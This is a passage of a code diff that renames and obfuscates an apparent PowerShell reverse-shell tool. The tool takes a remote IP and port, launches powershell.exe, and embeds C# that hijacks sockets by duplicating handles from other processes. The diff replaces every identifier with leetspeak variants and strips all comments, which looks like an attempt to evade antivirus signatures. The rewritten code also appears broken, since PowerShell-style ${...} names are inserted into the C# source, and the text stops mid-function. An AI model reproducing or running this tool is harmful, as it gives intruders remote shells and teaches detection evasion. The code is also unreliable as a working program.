@@ -1,55 +1,51 @@
-function Invoke-CONTs
+function Invoke-CPTSH
 {   
-   
     Param
     (
         [Parameter(Position = 0)]
         [String]
-        $RemoteIp,
+        ${R3m0t31p},
         
         [Parameter(Position = 1)]
         [String]
-        $RemotePort,
+        ${R3m0t3P0rt},
 
         [Parameter()]
         [String]
-        $Rows = "24",
+        ${R0w5} = "24",
 
         [Parameter()]
         [String]
-        $Cols = "80",
+        ${C0l5} = "80",
 
         [Parameter()]
         [String]
-        $CommandLine = "powershell.exe",
+        ${C0mm4ndL1n3} = "powershell.exe",
         
         [Parameter()]
         [Switch]
-        $Upgrade
+        ${Upgr4d3}
     )
     
-    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
-        $RemoteIp = "upgrade"
-        $RemotePort = "shell"
+    if( ${PSBoundParameters}.ContainsKey('Upgr4d3') ) {
+        ${R3m0t31p} = "upgrade"
+        ${R3m0t3P0rt} = "shell"
     }
     else{
-  
-        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
+        if(-Not(${PSBoundParameters}.ContainsKey('R3m0t31p'))) {
             throw "RemoteIp missing parameter"
         }
-        
-        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
+        if(-Not(${PSBoundParameters}.ContainsKey('R3m0t3P0rt'))) {
             throw "RemotePort missing parameter"
         }
     }
-    $parametersCONTs = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
-    Add-Type -TypeDefinition $Source -Language CSharp;
-    $output = [CONTsMainClass]::CONTsMain($parametersCONTs)
-    Write-Output $output
+    ${p4r4m3t3r5CPTSH} = @(${R3m0t31p}, ${R3m0t3P0rt}, ${R0w5}, ${C0l5}, ${C0mm4ndL1n3})
+    Add-Type -TypeDefinition ${S0urc3} -Language CSharp;
+    ${0utput} = [CPTSHMainClass]::CPTSHMain(${p4r4m3t3r5CPTSH})
+    Write-Output ${0utput}
 }
 
-$Source = @"
-
+${S0urc3} = @"
 using System;
 using System.IO;
 using System.Text;
@@ -61,78 +57,72 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Collections.Generic;
 
-public class CONTsException : Exception
+public class CPTSHException : Exception
 {
-    private const string error_string = "[-] CONTsException: ";
+    private const string ${3rr0r5tr1ng} = "[-] CPTSHException: ";
 
-    public CONTsException() { }
+    public CPTSHException() { }
 
-    public CONTsException(string message) : base(error_string + message) { }
+    public CPTSHException(string ${m3554g3}) : base(${3rr0r5tr1ng} + ${m3554g3}) { }
 }
 
 public class DeadlockCheckHelper
 {
+    private bool ${d34dl0ckD3t3ct3d};
+    private IntPtr ${t4rg3tH4ndl3};
 
-    private bool deadlockDetected;
-    private IntPtr targetHandle;
-
-    private delegate uint LPTHREAD_START_ROUTINE(uint lpParam);
+    private delegate uint LPTHREAD_START_ROUTINE(uint ${lpP4r4m});
 
     [DllImport("kernel32.dll")]
-    private static extern bool CloseHandle(IntPtr hObject);
+    private static extern bool CloseHandle(IntPtr ${h0bj3ct});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    private static extern UInt32 WaitForSingleObject(IntPtr ${hH4ndl3}, UInt32 ${dwM1ll153c0nd5});
 
     [DllImport("Kernel32.dll", SetLastError = true)]
-    private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+    private static extern IntPtr CreateThread(uint ${lpThr34d4ttr1but35}, uint ${dwSt4ckS1z3}, LPTHREAD_START_ROUTINE ${lpSt4rt4ddr355}, IntPtr ${lpP4r4m3t3r}, uint ${dwCr34t10nFl4g5}, out uint ${lpThr34d1d});
 
-    private uint ThreadCheckDeadlock(uint threadParams)
+    private uint ThreadCheckDeadlock(uint ${thr34dP4r4m5})
     {
-        IntPtr objPtr = IntPtr.Zero;
-        objPtr = SocketHijacking.NtQueryObjectDynamic(this.targetHandle, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
-        this.deadlockDetected = false;
-        if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
+        IntPtr ${0bjPtr} = IntPtr.Zero;
+        ${0bjPtr} = SocketHijacking.NtQueryObjectDynamic(this.${t4rg3tH4ndl3}, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
+        this.${d34dl0ckD3t3ct3d} = false;
+        if (${0bjPtr} != IntPtr.Zero) Marshal.FreeHGlobal(${0bjPtr});
         return 0;
     }
 
-    public bool CheckDeadlockDetected(IntPtr tHandle)
+    public bool CheckDeadlockDetected(IntPtr ${tH4ndl3})
     {
-        this.deadlockDetected = true;
-        this.targetHandle = tHandle;
-        LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
-        IntPtr hThread = IntPtr.Zero;
-        uint threadId = 0;
-        //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...
-        hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);
-        WaitForSingleObject(hThread, 1500);
-        //we do not kill the "pending" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
-        //just some waste of threads :(
-        CloseHandle(hThread);
-        return this.deadlockDetected;
+        this.${d34dl0ckD3t3ct3d} = true;
+        this.${t4rg3tH4ndl3} = ${tH4ndl3};
+        LPTHREAD_START_ROUTINE ${d3l3g4t3Thr34dCh3ckD34dl0ck} = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
+        IntPtr ${hThr34d} = IntPtr.Zero;
+        uint ${thr34d1d} = 0;
+        ${hThr34d} = CreateThread(0, 0, ${d3l3g4t3Thr34dCh3ckD34dl0ck}, IntPtr.Zero, 0, out ${thr34d1d});
+        WaitForSingleObject(${hThr34d}, 1500);
+        CloseHandle(${hThr34d});
+        return this.${d34dl0ckD3t3ct3d};
     }
 }
 
 public static class SocketHijacking
 {
-
-    private const uint NTSTATUS_SUCCESS = 0x00000000;
-    private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
-    private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
-    private const uint NTSTATUS_BUFFERTOOSMALL = 0xc0000023;
-    private const int NTSTATUS_PENDING = 0x00000103;
-    private const int WSA_FLAG_OVERLAPPED = 0x1;
-    private const int DUPLICATE_SAME_ACCESS = 0x2;
-    private const int SystemHandleInformation = 16;
-    private const int PROCESS_DUP_HANDLE = 0x0040;
-    private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
-    private const int SG_UNCONSTRAINED_GROUP = 0x1;
-    private const int SG_CONSTRAINED_GROUP = 0x2;
-    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
-    private const int EVENT_ALL_ACCESS = 0x1f0003;
-    private const int SynchronizationEvent = 1;
-    private const UInt32 INFINITE = 0xFFFFFFFF;
-
+    private const uint ${NTST4TUSSUCC355} = 0x00000000;
+    private const uint ${NTST4TUS1NF0L3NGTHM1SM4TCH} = 0xc0000004;
+    private const uint ${NTST4TUSBUFF3R0V3RFL0W} = 0x80000005;
+    private const uint ${NTST4TUSBUFF3RT005M4LL} = 0xc0000023;
+    private const int ${NTST4TUSP3ND1NG} = 0x00000103;
+    private const int ${WSAFL4G0V3RL4PP3D} = 0x1;
+    private const int ${DUPL1C4T3S4M34CC355} = 0x2;
+    private const int ${Syst3mH4ndl31nf0rm4t10n} = 16;
+    private const int ${PR0C355DUPH4NDL3} = 0x0040;
+    private const int ${S10TCP1NF0} = unchecked((int)0xD8000027);
+    private const int ${SGUNCONSTR41N3DGR0UP} = 0x1;
+    private const int ${SGCONSTR41N3DGR0UP} = 0x2;
+    private const uint ${10CTL4FDG3TC0NT3XT} = 0x12043;
+    private const int ${3V3NT4LL4CC355} = 0x1f0003;
+    private const int ${Synchr0n1z4t10n3v3nt} = 1;
+    private const UInt32 ${1NF1N1T3} = 0xFFFFFFFF;
 
     private enum SOCKET_STATE : uint
     {
@@ -146,8 +136,8 @@ public static class SocketHijacking
     private enum AFD_GROUP_TYPE : uint
     {
         GroupTypeNeither = 0,
-        GroupTypeConstrained = SG_CONSTRAINED_GROUP,
-        GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP
+        GroupTypeConstrained = ${SGCONSTR41N3DGR0UP},
+        GroupTypeUnconstrained = ${SGUNCONSTR41N3DGR0UP}
     }
 
     public enum OBJECT_INFORMATION_CLASS : int
@@ -190,8 +180,8 @@ public static class SocketHijacking
         public uint TotalNonPagedPoolUsage;
         public uint TotalNamePoolUsage;
         public uint TotalHandleTableUsage;
-        public uint HighWaterNumberOfObjects;// PeakObjectCount;
-        public uint HighWaterNumberOfHandles;// PeakHandleCount;
+        public uint HighWaterNumberOfObjects;
+        public uint HighWaterNumberOfHandles;
         public uint HighWaterPagedPoolUsage;
         public uint HighWaterNonPagedPoolUsage;
         public uint HighWaterNamePoolUsage;
@@ -199,13 +189,13 @@ public static class SocketHijacking
         public uint InvalidAttributes;
         public GENERIC_MAPPING GenericMapping;
         public uint ValidAccessMask;
-        public byte SecurityRequired;//bool
-        public byte MaintainHandleCount;//bool
+        public byte SecurityRequired;
+        public byte MaintainHandleCount;
         public byte TypeIndex;
         public byte ReservedByte;
         public uint PoolType;
-        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
-        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
+        public uint DefaultPagedPoolCharge;
+        public uint DefaultNonPagedPoolCharge;
     }
 
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
@@ -326,28 +316,12 @@ public static class SocketHijacking
         public Int32 Protocol;
         public Int32 LocalAddressLength;
         public Int32 RemoteAddressLength;
-
-        // Socket options controlled by getsockopt(), setsockopt().
         public linger LingerInfo;
         public UInt32 SendTimeout;
         public UInt32 ReceiveTimeout;
         public UInt32 ReceiveBufferSize;
         public UInt32 SendBufferSize;
-        /* Those are the bits in the SocketProerty, proper order:
-            Listening;
-            Broadcast;
-            Debug;
-            OobInline;
-            ReuseAddresses;
-            ExclusiveAddressUse;
-            NonBlocking;
-            DontUseWildcard;
-            ReceiveShutdown;
-            SendShutdown;
-            ConditionalAccept;
-        */
         public ushort SocketProperty;
-        // Snapshot of several parameters passed into WSPSocket() when creating this socket
         public UInt32 CreationFlags;
         public UInt32 CatalogEntryId;
         public UInt32 ServiceFlags1;
@@ -355,9 +329,7 @@ public static class SocketHijacking
         public UInt32 GroupID;
         public AFD_GROUP_TYPE GroupType;
         public Int32 GroupPriority;
-        // Last error set on this socket
         public Int32 LastError;
-        // Info stored for WSAAsyncSelect()
         public IntPtr AsyncSelecthWnd;
         public UInt32 AsyncSelectSerialNumber;
         public UInt32 AsyncSelectwMsg;
@@ -381,7 +353,6 @@ public static class SocketHijacking
         public UInt32 Padding;
         public SOCKADDR LocalAddress;
         public SOCKADDR RemoteAddress;
-        // Helper Data - found out with some reversing
         [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
         public byte[] HelperData;
     }
@@ -392,436 +363,396 @@ public static class SocketHijacking
         public UInt64 BytesIn;
     }
 
-
     [DllImport("WS2_32.DLL", CharSet = CharSet.Auto, SetLastError = true)]
-    private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);
+    private static extern int WSADuplicateSocket(IntPtr ${s0ck3tH4ndl3}, int ${pr0c3551d}, ref WSAPROTOCOL_INFO ${p1nn3dBuff3r});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
-    private static extern IntPtr WSASocket([In] int addressFamily, [In] int socketType, [In] int protocolType, ref WSAPROTOCOL_INFO lpProtocolInfo, Int32 group1, int dwFlags);
+    private static extern IntPtr WSASocket([In] int ${4ddr355F4m1ly}, [In] int ${s0ck3tTyp3}, [In] int ${pr0t0c0lTyp3}, ref WSAPROTOCOL_INFO ${lpPr0t0c0l1nf0}, Int32 ${gr0up1}, int ${dwFl4g5});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
     private static extern Int32 WSAGetLastError();
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
-    private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);
+    private static extern int getpeername(IntPtr ${5}, ref SOCKADDR_IN ${n4m3}, ref int ${n4m3l3n});
 
-    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
     [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
-    public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);
+    public static extern int WSAIoctl1(IntPtr ${5}, int ${dw10C0ntr0lC0d3}, ref UInt32 ${lpv1nBuff3r}, int ${cb1nBuff3r}, IntPtr ${lpv0utBuff3r}, int ${cb0utBuff3r}, ref int ${lpcbByt35R3turn3d}, IntPtr ${lp0v3rl4pp3d}, IntPtr ${lpC0mpl3t10nR0ut1n3});
 
     [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-    private static extern int closesocket(IntPtr s);
+    private static extern int closesocket(IntPtr ${5});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
+    private static extern IntPtr OpenProcess(int ${pr0c3554cc355}, bool ${b1nh3r1tH4ndl3}, int ${pr0c3551d});
 
     [DllImport("kernel32.dll", SetLastError = true)]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
+    private static extern bool DuplicateHandle(IntPtr ${hS0urc3Pr0c355H4ndl3}, IntPtr ${hS0urc3H4ndl3}, IntPtr ${hT4rg3tPr0c355H4ndl3}, out IntPtr ${lpT4rg3tH4ndl3}, uint ${dwD351r3d4cc355}, [MarshalAs(UnmanagedType.Bool)] bool ${b1nh3r1tH4ndl3}, uint ${dw0pt10n5});
 
     [DllImport("kernel32.dll")]
-    private static extern bool CloseHandle(IntPtr hObject);
+    private static extern bool CloseHandle(IntPtr ${h0bj3ct});
 
     [DllImport("kernel32.dll")]
     private static extern IntPtr GetCurrentProcess();
 
     [DllImport("ntdll.dll")]
-    private static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref int returnLength);
+    private static extern uint NtQueryObject(IntPtr ${0bj3ctH4ndl3}, OBJECT_INFORMATION_CLASS ${1nf0rm4t10nCl455}, IntPtr ${1nf0rm4t10nPtr}, uint ${1nf0rm4t10nL3ngth}, ref int ${r3turnL3ngth});
 
     [DllImport("ntdll.dll")]
-    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
+    private static extern uint NtQuerySystemInformation(int ${Syst3m1nf0rm4t10nCl455}, IntPtr ${Syst3m1nf0rm4t10n}, int ${Syst3m1nf0rm4t10nL3ngth}, ref int ${r3turnL3ngth});
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+    private static extern UInt32 WaitForSingleObject(IntPtr ${hH4ndl3}, UInt32 ${dwM1ll153c0nd5});
 
-    [DllImport("ntdll.dll")]
-    private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);
-
-    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
-    [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
-    private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);
+     [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
+    private static extern int NtDeviceIoControlFile1(IntPtr ${F1l3H4ndl3}, IntPtr ${3v3nt}, IntPtr ${4pcR0ut1n3}, IntPtr ${4pcC0nt3xt}, ref IO_STATUS_BLOCK ${10St4tusBl0ck}, uint ${10C0ntr0lC0d3}, IntPtr ${1nputBuff3r}, int ${1nputBuff3rL3ngth}, ref SOCKET_CONTEXT ${0utputBuff3r}, int ${0utputBuff3rL3ngth});
 
     [DllImport("Ws2_32.dll")]
-    public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
+    public static extern int ioctlsocket(IntPtr ${5}, int ${cmd}, ref int ${4rgp});
     
-    //helper method with "dynamic" buffer allocation
-    private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
+    private static IntPtr NtQuerySystemInformationDynamic(int ${1nf0Cl455}, int ${1nf0L3ngth})
     {
-        if (infoLength == 0)
-            infoLength = 0x10000;
-        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
+        if (${1nf0L3ngth} == 0)
+            ${1nf0L3ngth} = 0x10000;
+        IntPtr ${1nf0Ptr} = Marshal.AllocHGlobal(${1nf0L3ngth});
         while (true)
         {
-            uint result = (uint)NtQuerySystemInformation(infoClass, infoPtr, infoLength, ref infoLength);
-            infoLength = infoLength * 2;
-            if (result == NTSTATUS_SUCCESS)
-                return infoPtr;
-            Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
-            if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
+            uint ${r3sult} = (uint)NtQuerySystemInformation(${1nf0Cl455}, ${1nf0Ptr}, ${1nf0L3ngth}, ref ${1nf0L3ngth});
+            ${1nf0L3ngth} = ${1nf0L3ngth} * 2;
+            if (${r3sult} == ${NTST4TUSSUCC355})
+                return ${1nf0Ptr};
+            Marshal.FreeHGlobal(${1nf0Ptr});
+            if (${r3sult} != ${NTST4TUS1NF0L3NGTHM1SM4TCH} && ${r3sult} != ${NTST4TUSBUFF3R0V3RFL0W} && ${r3sult} != ${NTST4TUSBUFF3RT005M4LL})
             {
-                //throw new Exception("Unhandled NtStatus " + result);
                 return IntPtr.Zero;
             }
-            infoPtr = Marshal.AllocHGlobal(infoLength);
+            ${1nf0Ptr} = Marshal.AllocHGlobal(${1nf0L3ngth});
         }
     }
 
     private static IntPtr QueryObjectTypesInfo()
     {
-        IntPtr ptrObjectTypesInformation = IntPtr.Zero;
-        ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
-        return ptrObjectTypesInformation;
+        IntPtr ${ptr0bj3ctTyp35Inf0} = IntPtr.Zero;
+        ${ptr0bj3ctTyp35Inf0} = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
+        return ${ptr0bj3ctTyp35Inf0};
     }
 
-    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
-    private static long AlignUp(long address, long align)
+    private static long AlignUp(long ${4ddr355}, long ${4l1gn})
     {
-        return (((address) + (align) - 1) & ~((align) - 1));
+        return (((${4ddr355}) + (${4l1gn}) - 1) & ~((${4l1gn}) - 1));
     }
 
-    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "way" of counting index types.
-    // credits for this goes to @0xrepnz
-    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
-    private static byte GetTypeIndexByName(string ObjectName)
+    private static byte GetTypeIndexByName(string ${0bj3ctN4m3})
     {
-        byte TypeIndex = 0;
-        long TypesCount = 0;
-        IntPtr ptrTypesInfo = IntPtr.Zero;
-        ptrTypesInfo = QueryObjectTypesInfo();
-        TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();
-        // create a pointer to the first element address of OBJECT_TYPE_INFORMATION_V2
-        IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);
-        for (int i = 0; i < TypesCount; i++)
+        byte ${Typ31nd3x} = 0;
+        long ${Typ35C0unt} = 0;
+        IntPtr ${ptrTyp35Inf0} = IntPtr.Zero;
+        ${ptrTyp35Inf0} = QueryObjectTypesInfo();
+        ${Typ35C0unt} = Marshal.ReadIntPtr(${ptrTyp35Inf0}).ToInt64();
+        IntPtr ${ptrTyp35Inf0Curr3nt} = new IntPtr(${ptrTyp35Inf0}.ToInt64() + IntPtr.Size);
+        for (int ${1} = 0; ${1} < ${Typ35C0unt}; ${1}++)
         {
-            OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
-            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
-            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
-            if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
+            OBJECT_TYPE_INFORMATION_V2 ${Typ3} = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(${ptrTyp35Inf0Curr3nt}, typeof(OBJECT_TYPE_INFORMATION_V2));
+            ${ptrTyp35Inf0Curr3nt} = (IntPtr)(${ptrTyp35Inf0Curr3nt}.ToInt64() + AlignUp(${Typ3}.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
+            if (${Typ3}.TypeName.Length > 0 && Marshal.PtrToStringUni(${Typ3}.TypeName.Buffer, ${Typ3}.TypeName.Length / 2) == ${0bj3ctN4m3})
             {
-                TypeIndex = Type.TypeIndex;
+                ${Typ31nd3x} = ${Typ3}.TypeIndex;
                 break;
             }
         }
-        Marshal.FreeHGlobal(ptrTypesInfo);
-        return TypeIndex;
+        Marshal.FreeHGlobal(${ptrTyp35Inf0});
+        return ${Typ31nd3x};
     }
 
-    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> sockets)
+    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> ${s0ck3t5})
     {
-        List<IntPtr> dupedSocketsOut = new List<IntPtr>();
-        if (sockets.Count < 1) return dupedSocketsOut;
-        foreach (IntPtr sock in sockets)
+        List<IntPtr> ${dup3dS0ck3t50ut} = new List<IntPtr>();
+        if (${s0ck3t5}.Count < 1) return ${dup3dS0ck3t50ut};
+        foreach (IntPtr ${s0ck} in ${s0ck3t5})
         {
-            IntPtr dupedSocket = DuplicateSocketFromHandle(sock);
-            if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);
+            IntPtr ${dup3dS0ck3t} = DuplicateSocketFromHandle(${s0ck});
+            if (${dup3dS0ck3t} != IntPtr.Zero) ${dup3dS0ck3t50ut}.Add(${dup3dS0ck3t});
         }
-        // cleaning all socket handles
-        foreach (IntPtr sock in sockets)
-            CloseHandle(sock);
-        return dupedSocketsOut;
+        foreach (IntPtr ${s0ck} in ${s0ck3t5})
+            CloseHandle(${s0ck});
+        return ${dup3dS0ck3t50ut};
     }
 
-    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> sockets)
+    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> ${s0ck3t5})
     {
-        List<SOCKET_BYTESIN> socketsBytesIn = new List<SOCKET_BYTESIN>();
-        List<IntPtr> socketsOut = new List<IntPtr>();
-        foreach (IntPtr sock in sockets)
+        List<SOCKET_BYTESIN> ${s0ck3t5Byt35In} = new List<SOCKET_BYTESIN>();
+        List<IntPtr> ${s0ck3t50ut} = new List<IntPtr>();
+        foreach (IntPtr ${s0ck} in ${s0ck3t5})
         {
-            TCP_INFO_v0 sockInfo = new TCP_INFO_v0();
-            if (!GetSocketTcpInfo(sock, out sockInfo))
+            TCP_INFO_v0 ${s0ck1nf0} = new TCP_INFO_v0();
+            if (!GetSocketTcpInfo(${s0ck}, out ${s0ck1nf0}))
             {
-                closesocket(sock);
+                closesocket(${s0ck});
                 continue;
             }
-            // Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
-            // we need only active sockets, the remaing sockets are filtered out
-            if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
+            if (${s0ck1nf0}.State == TcpState.SynReceived || ${s0ck1nf0}.State == TcpState.Established)
             {
-                SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
-                sockBytesIn.handle = sock;
-                sockBytesIn.BytesIn = sockInfo.BytesIn;
-                socketsBytesIn.Add(sockBytesIn);
+                SOCKET_BYTESIN ${s0ckByt35In} = new SOCKET_BYTESIN();
+                ${s0ckByt35In}.handle = ${s0ck};
+                ${s0ckByt35In}.BytesIn = ${s0ck1nf0}.BytesIn;
+                ${s0ck3t5Byt35In}.Add(${s0ckByt35In});
             }
             else
-                closesocket(sock);
+                closesocket(${s0ck});
         }
-        if (socketsBytesIn.Count < 1) return socketsOut;
-        if (socketsBytesIn.Count >= 2)
-            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
-            socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
-        foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
+        if (${s0ck3t5Byt35In}.Count < 1) return ${s0ck3t50ut};
+        if (${s0ck3t5Byt35In}.Count >= 2)
+            ${s0ck3t5Byt35In}.Sort(delegate (SOCKET_BYTESIN ${4}, SOCKET_BYTESIN ${b}) { return (${4}.BytesIn.CompareTo(${b}.BytesIn)); });
+        foreach (SOCKET_BYTESIN ${s0ckByt35In} in ${s0ck3t5Byt35In})
         {
-            socketsOut.Add(sockBytesIn.handle);
-            // Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
+            ${s0ck3t50ut}.Add(${s0ckByt35In}.handle);
         }
-        return socketsOut;
+        return ${s0ck3t50ut};
     }
 
-    private static bool GetSocketTcpInfo(IntPtr socket, out TCP_INFO_v0 tcpInfoOut)
+    private static bool GetSocketTcpInfo(IntPtr ${s0ck3t}, out TCP_INFO_v0 ${tcp1nf00ut})
     {
-        int result = -1;
-        UInt32 tcpInfoVersion = 0;
-        int bytesReturned = 0;
-        int tcpInfoSize = Marshal.SizeOf(typeof(TCP_INFO_v0));
-        IntPtr tcpInfoPtr = Marshal.AllocHGlobal(tcpInfoSize);
-        result = WSAIoctl1(socket, SIO_TCP_INFO, ref tcpInfoVersion, Marshal.SizeOf(tcpInfoVersion), tcpInfoPtr, tcpInfoSize, ref bytesReturned, IntPtr.Zero, IntPtr.Zero);
-        if (result != 0)
+        int ${r3sult} = -1;
+        UInt32 ${tcp1nf0V3rs10n} = 0;
+        int ${byt35R3turn3d} = 0;
+        int ${tcp1nf0S1z3} = Marshal.SizeOf(typeof(TCP_INFO_v0));
+        IntPtr ${tcp1nf0Ptr} = Marshal.AllocHGlobal(${tcp1nf0S1z3});
+        ${r3sult} = WSAIoctl1(${s0ck3t}, ${S10TCP1NF0}, ref ${tcp1nf0V3rs10n}, Marshal.SizeOf(${tcp1nf0V3rs10n}), ${tcp1nf0Ptr}, ${tcp1nf0S1z3}, ref ${byt35R3turn3d}, IntPtr.Zero, IntPtr.Zero);
+        if (${r3sult} != 0)
         {
-            // Console.WriteLine("debug: WSAIoctl1 failed with return code " + result.ToString() + " and wsalasterror: " + WSAGetLastError().ToString());
-            tcpInfoOut = new TCP_INFO_v0();
+            ${tcp1nf00ut} = new TCP_INFO_v0();
             return false;
         }
-        TCP_INFO_v0 tcpInfoV0 = (TCP_INFO_v0)Marshal.PtrToStructure(tcpInfoPtr, typeof(TCP_INFO_v0));
-        tcpInfoOut = tcpInfoV0;
-        Marshal.FreeHGlobal(tcpInfoPtr);
+        TCP_INFO_v0 ${tcp1nf0V0} = (TCP_INFO_v0)Marshal.PtrToStructure(${tcp1nf0Ptr}, typeof(TCP_INFO_v0));
+        ${tcp1nf00ut} = ${tcp1nf0V0};
+        Marshal.FreeHGlobal(${tcp1nf0Ptr});
         return true;
     }
 
-    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
-    private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
+    private static IntPtr DuplicateSocketFromHandle(IntPtr ${s0ck3tH4ndl3})
     {
-        IntPtr retSocket = IntPtr.Zero;
-        IntPtr duplicatedSocket = IntPtr.Zero;
-        WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
-        int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
-        if (status == 0)
+        IntPtr ${r3tS0ck3t} = IntPtr.Zero;
+        IntPtr ${dup1ic4t3dS0ck3t} = IntPtr.Zero;
